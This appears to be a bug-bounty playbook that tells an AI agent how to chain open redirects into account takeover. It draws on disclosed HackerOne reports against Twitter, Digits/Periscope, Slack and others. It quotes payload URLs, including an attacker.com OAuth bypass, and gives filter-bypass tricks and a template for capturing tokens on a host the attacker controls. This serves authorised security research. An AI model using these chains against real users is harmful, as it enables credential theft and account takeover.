---
title: "Redirect-to-Token / ATO Chains — authenticity_token POSTs, OAuth token smuggling, callback takeover"
type: playbook
category: redirect-token-ato-chains
cwe: "CWE-601"
source_count: 8
full_bodies_available: 8
corpus: "h1.security.nathan.sx roster (198 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-28"
note: "Anchor bodies: RDIR-49759 (Twitter authenticity_token, $1,400 json), RDIR-108113 (Digits callback takeover, $2,520 list), RDIR-207170 (Slack xoxs, $3,000 list). Claims trace to bodies read 2026-10-29."
---

# Redirect-to-Token / ATO Chains — the paying half of the class

## 1. Overview

Eight cases. The pattern: the redirect destination receives **state** — a POST body, a URL
fragment, a referrer header — and the redirect makes that state land on the attacker. This is
where "Low" becomes $1,400–$3,000. Three capture mechanisms:

| Mechanism | Cases |
|---|---|
| POST body rides the redirect (form auto-submits cross-origin) | 49759, 50752 |
| OAuth token/code lands in URL on attacker-chosen redirect_uri | 99435, 140432, 244958, 7900 (redirect half in 02) |
| Validation bypass → OAuth credential takeover | 108113 |
| Popup/postMessage token theft | 207170 |
| Token in referrer after profile-redirect | 25160, 140432 |

## 2. The anchor — RDIR-49759 (mobile.twitter.com, $1,400 json)

The clearest POST-rides-redirect body in the corpus:

> URL: https://mobile.twitter.com/messages/follow?recipient=/example.com
> when I click 'Follow'
> I will send my POST request to https://example.com
> witch contains my authenticity_token (sic)
> that can be used for anything like tweeting, following, sending messages, changing username.,.,.etc (sic)
> it can be used too to Add a mobile number, and then steal the account by recovering it by the mobile number.

Agent lessons:

1. **The path is the redirect**: `?recipient=/example.com` — a value that *looks like* an
   in-app path is re-parsed as an absolute URL by the redirect logic. `/path`-shaped params
   must be in every probe list.
2. **What makes this High: the POST follows the redirect.** A form submitted to a URL that
   30x's to another origin carries the full body — `authenticity_token` included — and some
   stacks process it. The reporter names the endgame: mobile-number binding → recovery takeover.
3. Evidence standard: show the token arriving at a host you control (log the POST), then argue
   one concrete abuse (the reporter chose account recovery).

## 3. The integer-IP variant — RDIR-50752 ($560 json) + RDIR-57163

> URL: https://mobile.twitter.com//example/messages (there is double slash before "example" word)
> when you click "send" after writing a message the authenticity_token will send to https://example
> this URL doesn't allow any dots in it, so i can not write //example.com (sic)
> but when i write a number it will redirect me to an ip,
> EG:
> https://mobile.twitter.com//0/messages
> >> 0.0.0.0
> when i write a longer number it will redirect me to another ip
> i fount this website that can change server or a website to ip (sic)
> https://www.site24x7.com/find-ip-address-of-web-site.html
> then i fount this website that can change any ip to a single number (without dots)
> http://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx
> so i'll change http://example.com to an ip by the first website
> http://example.com = 93.184.216.34
> now i'll change 93.184.216.34 to a single number without dots by the second website
> 93.184.216.34 = 1572395042
> now to redirect from twitter to example.com
> https://mobile.twitter.com//1572395042/messages

The dot-filter is defeated by decimal-integer hostnames (`1572395042` == `93.184.216.34`).
Keep two converter steps banked: domain → IP (any resolver) → IP → 32-bit integer.

## 4. The OAuth validation-bypass — RDIR-108113 (Digits, $2,520 list)

The class's most technical single bug — non-ASCII mangled *after* validation:

> Input:
> https://[REDACTED_EMAIL]
> --------\  authority   /\   hostname   /
> The URL is parsed and passes the validation because the hostname matches the registered domain.
> Output:
> https://attacker.com?@www.periscope.tv
> --------\ hostname /-\     query     /
> Since the URL is outputted in the location header, %ff which is non-ASCII is converted.

> #Impact
> It affects every application that has integrated Digits, and even official application
> (Periscope). Attacker can abuse the flaw to login to victim's account on the affected
> applications.

Agent lessons:

1. **Validation and emission are different parsers.** Parse with the RFC order (authority ∋
   userinfo@host), emit with a lossy encoder — the gap is the bug. Probe `%ff`, `%ff%fe`, raw
   non-UTF8 bytes in the userinfo position.
2. The proof is end-to-end: *"After that your account will be renamed as 'Pwn3d'"* — the
   reporter demonstrated account control on a real app (Periscope), not a header echo.
3. Fix framing: "The *callback_url* should discard the authority part before outputting."

## 5. OAuth token capture variants

- **RDIR-99435 (badoo, $153 list)** — Facebook `#access_token` to a suffix-joined URL, browser-
  conditional (IE11/Edge only):
  > The URL can't be like http://google.com/, but it can be like http://google.com%2f.badoo.com/
  > which is a valid URL for Internet Explorer (11 and Edge).
  > You are redirected to https://www.google.com/.badoo.com/#access_token=[REDACTED_SECRET]
- **RDIR-140432 (gratipay, $10 list)** — redirect_uri to own profile → token in Referer:
  > As you can see it will send the token to my profile (/~attacka) and my profile points to
  > example.com, if the user clicks on that link the referrer header will send tokenz (obviously lol) (sic)
- **RDIR-244958 (wakatime, low)** — `next=` to own profile leaks the OAuth token; reporter
  cross-references 140432 as "almost the exact same scenario".
- **RDIR-207170 (Slack, $3,000 list)** — team-summary body:
  > @fransrosen discovered a vulnerability which would allow an attacker running a malicious site
  > to steal XOXS tokens. We resolved the postMessage and call-popup redirect issues, and
  > performed a thorough investigation to confirm that this had never been exploited.
- **RDIR-25160 (phabricator, $400 list)** — redirect + Disqus token (Facebook not affected):
  > It is possible to redirect users to malicious websites and steal their Disqus access token

## 6. Agent execution template

```text
P0 — with every open redirect found (module 01/02): ask "what state reaches the destination?"
     1. is the redirect on a form POST endpoint?        → capture POST body
     2. is the redirect an OAuth return_uri/callback?   → capture fragment/query
     3. does the landing page send Referer to a link?   → capture Referer
P1 — build capture: your host logs the full request (query, fragment won't hit server logs —
     run a JS logger in-page for #access_token).
P2 — filters in the way:
     1. dot-filter → integer-IP host
     2. hostname-must-match → non-ASCII userinfo %[REDACTED_EMAIL]
     3. suffix-whitelist → google.com%2f.badoo.com (name the browser)
P3 — impact: name the concrete ATO step (mobile-number binding, account rename, tweet control).
```

## 7. Validation gates

1. Token/state captured on attacker infrastructure — log line or video, not a claim.
2. Token demonstrated *usable* (the 49759/108113 standard) or the leak channel proven reachable
   (referrer/fragment path shown).
3. Browser-conditional rows must name the browser+version (99435: IE11/Edge).
4. Chain severity argued from the token's actual scope, never "could potentially".

## 8. Adjacency

- OAuth hash-smuggling doctrine (`response_type=token` → `#access_token=`) is byte-quoted from
  the zseano guide in `references/blogs-index.md` §1 — same mechanism, era-proof.
- 108113's parse-vs-emit gap is the same class as `../CSRF/05_Validation-Gaps-and-Bypasses.md`
  loose-comparison rows: validation correct in one representation, broken in another.

## 9. Archive-label honesty

- 49759, 50752, 126203-family: json amounts. 108113, 99435, 207170, 25160, 140432, 244958: list
  figures (43 fetched rows carry `has_bounty?:true` with the amount withheld — 108113 and 207170
  among them; labeled list per the vault rule).
- 207170 and 161991-style rows are team-written summaries — the reporter's technique detail
  (fransrosen's writeup) lives outside the fetch; treat as team-attested, quoted verbatim only.

## 10. Cross-references

- Module 02 (the redirect_uri validator gaps that feed these), module 06 (XSS chains as alternate
  capture), `../XXE` for OOB-capture discipline on blind confirmation.
